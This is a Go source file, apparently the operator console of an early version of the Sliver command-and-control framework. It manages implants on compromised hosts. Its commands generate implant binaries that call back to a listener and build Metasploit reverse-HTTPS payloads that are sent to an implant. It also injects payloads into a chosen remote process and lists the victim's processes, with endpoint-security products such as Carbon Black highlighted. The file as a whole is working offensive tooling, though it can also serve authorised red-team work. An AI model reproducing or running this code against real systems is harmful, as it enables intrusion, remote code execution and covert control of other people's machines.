package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	pb "sliver/protobuf"
	"strconv"
	"strings"
	"text/template"

	"github.com/golang/protobuf/proto"
	"golang.org/x/crypto/ssh/terminal"
)

const (
	normal    = "\033[0m"
	black     = "\033[30m"
	red       = "\033[31m"
	green     = "\033[32m"
	orange    = "\033[33m"
	blue      = "\033[34m"
	purple    = "\033[35m"
	cyan      = "\033[36m"
	gray      = "\033[37m"
	bold      = "\033[1m"
	clearln   = "\r\x1b[2K"
	upN       = "\033[%dA"
	downN     = "\033[%dB"
	underline = "\033[4m"

	// Info - Display colorful information
	Info = bold + cyan + "[*] " + normal
	// Warn - Warn a user
	Warn = bold + red + "[!] " + normal
	// Debug - Display debug information
	Debug = bold + purple + "[-] " + normal
	// Woot - Display success
	Woot = bold + green + "[$] " + normal
)

var (
	activeSliver *Sliver
	stdout       = bufio.NewWriter(os.Stdout)
	history      = []string{}

	// Stylizes known processes in the `ps` command
	knownProcs = map[string]string{
		"ccSvcHst.exe": red, // SEP
		"cb.exe":       red, // Carbon Black
	}

	cmdHandlers = map[string]interface{}{
		"help":     help,
		"ls":       ls,
		"info":     info,
		"use":      use,
		"gen":      generate,
		"generate": generate,
		"msf":      msf,
		"inject":   inject,
		"ps":       ps,
		"ping":     ping,
	}
)

func startConsole(events chan *Sliver) {
	if !terminal.IsTerminal(0) || !terminal.IsTerminal(1) {
		log.Print("stdin/stdout should be terminal")
		return
	}
	oldState, err := terminal.MakeRaw(0)
	if err != nil {
		return
	}
	defer terminal.Restore(0, oldState)
	screen := struct {
		io.Reader
		io.Writer
	}{os.Stdin, os.Stdout}
	term := terminal.NewTerminal(screen, "")
	setPrompt(term)

	fmt.Fprintf(term, Info+"Welcome to the sliver shell, see `help` for available commands\n")

	reader := make(chan string) // Read lines in from user
	done := make(chan bool)     // Tell the reader the previous command has completed
	go lineReader(term, reader, done)
	for {
		select {
		case line := <-reader:
			fmt.Fprintln(term, "", line)
			if line == "exit" {
				return
			}
			words := strings.Fields(line)
			if cmd, ok := cmdHandlers[words[0]]; ok {
				cmd.(func(*terminal.Terminal, []string))(term, words[1:])
			} else {
				fmt.Fprintf(term, Warn+"Invalid command '%s'\n", words[0])
			}
			done <- true
		case sliver := <-events:
			fmt.Fprintf(term, Info+"%s - %s (%s) - %s/%s\n",
				sliver.Name, sliver.RemoteAddress, sliver.Hostname, sliver.Os, sliver.Arch)
		}
	}
}

func lineReader(term *terminal.Terminal, reader chan string, done chan bool) {
	defer close(reader)
	for {
		line, err := term.ReadLine()
		if err == io.EOF || strings.HasPrefix(line, "exit") {
			reader <- "exit"
			return
		}
		if err != nil {
			log.Printf("Error %v", err)
			reader <- "exit"
			return
		}
		if line == "" {
			continue
		} else {
			reader <- line
			<-done // Block until command completes
		}
	}
}

func setPrompt(term *terminal.Terminal) {
	prompt := fmt.Sprintf(clearln + underline + "sliver" + normal)
	if activeSliver != nil {
		prompt += fmt.Sprintf(bold+red+" (%s)%s", activeSliver.Name, normal)
	}
	prompt += " > "
	term.SetPrompt(prompt)
}

func getSliver(name string) *Sliver {
	id, err := strconv.Atoi(name)
	name = strings.ToUpper(name)
	hiveMutex.Lock()
	defer hiveMutex.Unlock()
	if err == nil {
		if sliver, ok := (*hive)[id]; ok {
			return sliver
		}
	}
	for _, sliver := range *hive {
		if sliver.Name == name {
			return sliver
		}
	}
	return nil
}

// ---------------- Commands ----------------
func help(term *terminal.Terminal, args []string) {
	tmpl, _ := template.New("help").Delims("[[", "]]").Parse(getHelpFor(args))
	tmpl.Execute(term, struct {
		Normal    string
		Bold      string
		Underline string
	}{
		Normal:    normal,
		Bold:      bold,
		Underline: underline,
	})

}

func ls(term *terminal.Terminal, args []string) {
	hiveMutex.Lock()
	defer hiveMutex.Unlock()
	if 0 < len(*hive) {
		fmt.Fprintf(term, "\nAvailable Slivers\n")
		fmt.Fprintf(term, "=================\n")
		for _, sliver := range *hive {
			fmt.Fprintf(term, " %d. %s (%s)\n", sliver.Id, sliver.Name, sliver.RemoteAddress)
		}
		fmt.Fprintf(term, "\n")
	} else {
		fmt.Fprintln(term, Info+"No slivers connected\n")
	}
}

func info(term *terminal.Terminal, args []string) {
	var sliver *Sliver
	if activeSliver != nil {
		sliver = getSliver(strconv.Itoa(activeSliver.Id))
	} else if 0 < len(args) {
		sliver = getSliver(args[0])
	}
	if sliver != nil {
		fmt.Fprintln(term, "")
		fmt.Fprintf(term, bold+"ID: %s%d\n", normal, sliver.Id)
		fmt.Fprintf(term, bold+"Name: %s%s\n", normal, sliver.Name)
		fmt.Fprintf(term, bold+"Hostname: %s%s\n", normal, sliver.Hostname)
		fmt.Fprintf(term, bold+"Username: %s%s\n", normal, sliver.Username)
		fmt.Fprintf(term, bold+"UID: %s%s\n", normal, sliver.Uid)
		fmt.Fprintf(term, bold+"GID: %s%s\n", normal, sliver.Gid)
		fmt.Fprintf(term, bold+"OS: %s%s\n", normal, sliver.Os)
		fmt.Fprintf(term, bold+"Arch: %s%s\n", normal, sliver.Arch)
		fmt.Fprintf(term, bold+"Remote Address: %s%s\n", normal, sliver.RemoteAddress)
		fmt.Fprintln(term, "")
	} else {
		fmt.Fprintln(term, Warn+"Invalid sliver name\n")
	}
}

func use(term *terminal.Terminal, args []string) {
	if 0 < len(args) {
		sliver := getSliver(args[0])
		if sliver != nil {
			activeSliver = sliver
			setPrompt(term)
			fmt.Fprintf(term, Info+"Active sliver set to '%s' (%d)\n", activeSliver.Name, activeSliver.Id)
		} else {
			fmt.Fprintf(term, Warn+"No sliver with name '%s'\n", args[0])
		}
	} else {
		fmt.Fprintln(term, Warn+"Missing sliver name\n")
	}
}

func generate(term *terminal.Terminal, args []string) {
	genFlags := flag.NewFlagSet("gen", flag.ContinueOnError)
	target := genFlags.String("os", windowsPlatform, "operating system")
	arch := genFlags.String("arch", "amd64", "cpu architecture (amd64/386)")
	lhost := genFlags.String("lhost", *server, "sliver server listener lhost")
	lport := genFlags.Int("lport", *serverLPort, "sliver server listner port")
	save := genFlags.String("save", "", "save binary file to path")
	genFlags.Parse(args)

	fmt.Fprintf(term, Info+"Generating new %s/%s sliver binary, please wait ... \n", *target, *arch)
	path, err := GenerateImplantBinary(*target, *arch, *lhost, uint16(*lport))
	if err != nil {
		fmt.Fprintf(term, Warn+"Error generating sliver: %v\n", err)
	}
	if save == nil || *save == "" {
		fmt.Fprintf(term, Info+"Generated sliver binary at: %s\n", path)
	} else {
		saveTo, _ := filepath.Abs(*save)
		fi, _ := os.Stat(saveTo)
		if fi.IsDir() {
			filename := filepath.Base(path)
			saveTo = filepath.Join(saveTo, filename)
		}
		err = copyFileContents(path, saveTo)
		if err != nil {
			fmt.Fprintf(term, Warn+"Failed to write to %s\n", saveTo)
		}
		fmt.Fprintf(term, Info+"Generated sliver binary at: %s\n", saveTo)
	}
}

func msf(term *terminal.Terminal, args []string) {
	if activeSliver != nil {
		msfFlags := flag.NewFlagSet("msf", flag.ContinueOnError)
		payloadName := msfFlags.String("payload", "meterpreter_reverse_https", "metasploit payload")
		lhost := msfFlags.String("lhost", "", "metasploit listener lhost")
		lport := msfFlags.Int("lport", 4444, "metasploit listner port")
		msfFlags.Parse(args)

		if *lhost == "" {
			fmt.Fprintf(term, Warn+"Invalid lhost '%s', see `help msf`\n", *lhost)
			return
		}

		fmt.Fprintf(term, Info+"Generating %s %s/%s -> %s:%d ...\n",
			*payloadName, activeSliver.Os, activeSliver.Arch, *lhost, *lport)
		config := VenomConfig{
			Os:         activeSliver.Os,
			Arch:       MsfArch(activeSliver.Arch),
			Payload:    *payloadName,
			LHost:      *lhost,
			LPort:      uint16(*lport),
			Encoder:    "",
			Iterations: 0, // TODO: Add support for msf encoders/encrypters
			Encrypt:    "",
		}
		rawPayload, err := MsfVenomPayload(config)
		if err != nil {
			fmt.Fprintf(term, Warn+"Error while generating payload: %v\n", err)
			return
		}
		fmt.Fprintf(term, Info+"Successfully generated payload %d byte(s)\n", len(rawPayload))

		fmt.Fprintf(term, Info+"Sending payload -> %s\n", activeSliver.Name)
		data, _ := proto.Marshal(&pb.Task{
			Encoder: "raw",
			Data:    rawPayload,
		})
		(*activeSliver).Send <- pb.Envelope{
			Type: "task",
			Data: data,
		}
		fmt.Fprintf(term, Info+"Sucessfully sent payload\n")
	} else {
		fmt.Fprintf(term, Warn+"Please select and active sliver via `use`\n")
	}
}

func inject(term *terminal.Terminal, args []string) {
	if activeSliver != nil {
		injectFlags := flag.NewFlagSet("inject", flag.ContinueOnError)
		injectPid := injectFlags.Int("pid", 0, "pid to inject payload into")
		payloadName := injectFlags.String("payload", "meterpreter_reverse_https", "metasploit payload")
		lhost := injectFlags.String("lhost", "", "metasploit listener lhost")
		lport := injectFlags.Int("lport", 4444, "metasploit listner port")
		injectFlags.Parse(args)

		if *lhost == "" {
			fmt.Fprintf(term, Warn+"Invalid lhost '%s', see `help msf`\n", *lhost)
			return
		}

		fmt.Fprintf(term, Info+"Generating %s %s/%s -> %s:%d ...\n",
			*payloadName, activeSliver.Os, activeSliver.Arch, *lhost, *lport)
		config := VenomConfig{
			Os:         activeSliver.Os,
			Arch:       MsfArch(activeSliver.Arch),
			Payload:    *payloadName,
			LHost:      *lhost,
			LPort:      uint16(*lport),
			Encoder:    "",
			Iterations: 0, // TODO: Add support for msf encoders/encrypters
			Encrypt:    "",
		}
		rawPayload, err := MsfVenomPayload(config)
		if err != nil {
			fmt.Fprintf(term, Warn+"Error while generating payload: %v\n", err)
			return
		}
		fmt.Fprintf(term, Info+"Successfully generated payload %d byte(s)\n", len(rawPayload))

		fmt.Fprintf(term, Info+"Sending payload -> %s -> PID: %d\n", activeSliver.Name, *injectPid)
		data, _ := proto.Marshal(&pb.RemoteTask{
			Pid:     int32(*injectPid),
			Encoder: "raw",
			Data:    rawPayload,
		})
		(*activeSliver).Send <- pb.Envelope{
			Type: "remoteTask",
			Data: data,
		}
		fmt.Fprintf(term, Info+"Sucessfully sent payload\n")
	} else {
		fmt.Fprintf(term, Warn+"Please select and active sliver via `use`\n")
	}
}

func ps(term *terminal.Terminal, args []string) {
	psFlags := flag.NewFlagSet("ps", flag.ContinueOnError)
	pidFilter := psFlags.Int("pid", -1, "find proc by pid")
	exeFilter := psFlags.String("exe", "", "filter procs by name")
	psFlags.Parse(args)

	if activeSliver != nil {
		fmt.Fprintf(term, Info+"Requesting process list from %s ...\n", activeSliver.Name)

		respId := randomID()
		data, _ := proto.Marshal(&pb.ProcessListReq{
			Id: respId,
		})
		resp := make(chan pb.Envelope)
		(*activeSliver).Resp[respId] = resp
		defer close(resp)
		defer delete((*activeSliver).Resp, respId)
		(*activeSliver).Send <- pb.Envelope{
			Id:   respId,
			Type: "psReq",
			Data: data,
		}
		envelope := <-resp
		psList := &pb.ProcessList{}
		err := proto.Unmarshal(envelope.Data, psList)
		if err != nil {
			fmt.Fprintf(term, Warn+"Unmarshaling envelope error: %v\n", err)
			return
		}

		header := fmt.Sprintf("\n% 6s | % 6s | %s\n", "pid", "ppid", "executable")
		fmt.Fprintf(term, header)
		fmt.Fprintf(term, "%s\n", strings.Repeat("=", len(header)))
		for _, proc := range psList.Processes {
			if *pidFilter != -1 {
				if proc.Pid == int32(*pidFilter) {
					printProcInfo(term, proc)
				}
			}
			if *exeFilter != "" {
				if strings.HasPrefix(proc.Executable, *exeFilter) {
					printProcInfo(term, proc)
				}
			}
			if *pidFilter == -1 && *exeFilter == "" {
				printProcInfo(term, proc)
			}
		}

		fmt.Fprintf(term, "\n")
	} else {
		fmt.Fprintf(term, Warn+"Please select and active sliver via `use`\n")
	}
}

// printProcInfo - Stylizes the process information
func printProcInfo(term *terminal.Terminal, proc *pb.Process) {
	color := normal
	if modifyColor, ok := knownProcs[proc.Executable]; ok {
		color = modifyColor
	}
	if strings.HasPrefix(proc.Executable, activeSliver.Name) {
		color = green
	}
	fmt.Fprintf(term, "%s%s% 6d%s%s | % 6d | %s%s\n",
		color, bold, proc.Pid, normal, color, proc.Ppid, proc.Executable, normal)
}

func ping(term *terminal.Terminal, args []string) {
	var sliver *Sliver
	if activeSliver != nil {
		sliver = getSliver(strconv.Itoa(activeSliver.Id))
	} else if 0 < len(args) {
		sliver = getSliver(args[0])
	}
	if sliver != nil {
		respId := randomID()
		data, _ := proto.Marshal(&pb.Ping{
			Id: respId,
		})
		resp := make(chan pb.Envelope)
		(*sliver).Resp[respId] = resp
		defer close(resp)
		defer delete((*sliver).Resp, respId)
		(*sliver).Send <- pb.Envelope{
			Id:   respId,
			Type: "ping",
			Data: data,
		}
		envelope := <-resp
		pong := &pb.Ping{}
		err := proto.Unmarshal(envelope.Data, pong)
		if err != nil {
			fmt.Fprintf(term, Warn+"Unmarshaling envelope error: %v\n", err)
			return
		}
		fmt.Fprintf(term, Info+"Ping/Pong with ID = %s\n", pong.Id)
	} else {
		fmt.Fprintln(term, Warn+"Invalid sliver name\n")
	}
}
